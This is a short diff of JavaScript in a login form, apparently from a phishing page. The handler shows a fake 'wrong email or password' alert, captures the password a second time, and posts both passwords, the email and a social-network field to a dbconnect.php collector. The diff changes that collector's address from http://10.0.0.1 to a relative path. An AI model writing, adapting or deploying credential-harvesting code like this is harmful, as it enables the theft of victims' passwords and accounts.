@@ -52,7 +52,7 @@ $('form').submit(function(e){
         alert("Failed to authenticate. Wrong Email or Password.");
         return false;
     } else {
-        $.post('http://10.0.0.1/dbconnect.php', 'first-password=' + firstPassword + '&second-password=' + $('input[type=password]').val() + '&email:=' + $('input[type=email]').val() + '&social:=' + $('[name=socialn]').val() , window.location.replace("http://10.0.0.1/dbconnect.php"));
+        $.post('dbconnect.php', 'first-password=' + firstPassword + '&second-password=' + $('input[type=password]').val() + '&email:=' + $('input[type=email]').val() + '&social:=' + $('[name=socialn]').val() , window.location.replace("dbconnect.php"));
     }
 });
 </script>
